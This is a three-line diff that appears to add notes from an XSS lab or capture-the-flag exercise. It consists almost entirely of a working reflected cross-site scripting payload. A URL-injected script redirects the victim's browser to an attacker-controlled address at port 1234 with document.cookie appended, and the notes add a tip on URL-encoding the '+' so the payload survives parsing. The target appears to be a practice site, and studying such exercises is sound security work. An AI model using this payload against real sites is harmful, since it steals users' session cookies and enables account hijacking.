@@ -1,0 +1,3 @@
+Nothing after the "+" gets parsed, hence we need to encode the "+" by entering "%2B"
+
+http://xss2.adriaan.haxx.be/index.php?msg=<script>window.location.href = "http://192.168.7.54:1234/?"%2Bdocument.cookie;</script>
